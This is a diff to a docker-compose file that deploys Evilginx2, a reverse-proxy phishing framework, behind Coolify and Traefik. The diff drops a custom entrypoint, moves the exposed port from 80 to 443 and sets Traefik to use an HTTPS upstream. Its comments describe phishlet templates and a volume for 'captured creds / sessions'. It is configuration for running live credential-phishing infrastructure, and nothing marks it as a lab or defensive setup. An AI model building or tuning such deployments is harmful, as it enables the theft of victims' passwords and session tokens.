@@ -3,30 +3,19 @@ version: "3.8"
 services:
   evilginx:
     image: warhorse/evilginx2:latest
-    container_name: evilginx2
-
-    # Completely replace the original entry‑point with an array
-    entrypoint:
-      - /bin/evilginx
-      - -developer
-      - -p
-      - /phishlets
-      - -c
-      - /config
-      - -http-port
-      - "80"
-      - -https-port
-      - "0"
+    container_name: evilginx2          # friendly name (optional)
 
     expose:
-      - "80"
+      - "443"                          # Evilginx listens on 443 inside
 
     labels:
-      - coolify.port=80                # Traefik forwards plain HTTP
+      - coolify.port=443               # Coolify/Traefik targets port 443
+      - traefik.http.services.evilginx.loadbalancer.server.scheme=https
+                                        # tell Traefik to use HTTPS upstream
 
     volumes:
-      - ./phishlets:/phishlets         # phishlet YAMLs
-      - config_data:/config            # sessions, creds, settings
+      - ./phishlets:/phishlets          # your YAML templates
+      - config_data:/config             # captured creds / sessions
 
     restart: unless-stopped
 
